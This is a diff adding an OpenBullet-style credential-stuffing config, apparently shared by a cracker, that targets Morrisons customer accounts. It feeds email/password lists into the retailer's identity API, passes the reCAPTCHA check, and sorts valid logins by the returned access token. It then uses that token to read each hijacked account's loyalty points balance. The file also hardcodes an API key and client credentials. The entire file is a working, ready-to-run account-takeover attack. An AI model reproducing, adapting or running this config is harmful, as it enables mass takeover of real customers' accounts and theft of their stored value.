@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "MorrisonsApi",
+  "SuggestedBots": 20,
+  "LastModified": "2019-04-01T21:09:55.3142647+01:00",
+  "AdditionalInfo": "",
+  "Author": "Shycrackzz",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+RECAPTCHA "http://com.morrisons.matchandmore.app/" "6Ldgg3UUAAAAAKl8MTIvEFtf8vXg-ng6mh04mDiZ" -> VAR "RECAP" 
+#MORRISONS REQUEST POST " https://api.morrisons.com/identity/v1/token?apikey=BQR1ZfddMlz8chyLsOCyp4Ij0OLah7CE" 
+  CONTENT "grant_type=password&password=<PASS>&recaptcha=<RECAP>&username=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=utf-8" 
+  HEADER "User-Agent: Morrisons%20More/183 CFNetwork/974.2.1 Darwin/18.0.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Basic QlFSMVpmZGRNbHo4Y2h5THNPQ3lwNElqME9MYWg3Q0U6SkhZRW92WVNWQnJnS1lVNg==" 
+#IS KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Failure OR 
+    KEY "User credentials are invalid" 
+#DEAD PARSE "<SOURCE>" LR "access_token\": \"" "\"," -> VAR "ATOK" 
+#RIP_IT_NEEDS REQUEST GET "https://api.morrisons.com/point/v1/customers/@me/schemes?apikey=BQR1ZfddMlz8chyLsOCyp4Ij0OLah7CE&includeBasketDetail=false" 
+  
+  HEADER "User-Agent: Morrisons%20More/183 CFNetwork/974.2.1 Darwin/18.0.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-gb" 
+  HEADER "Authorization: Bearer <ATOK>" 
+#ANTICATPCHA_NOW PARSE "<SOURCE>" LR "More\",\"customerBalance\":" "," -> CAP "Balance" 
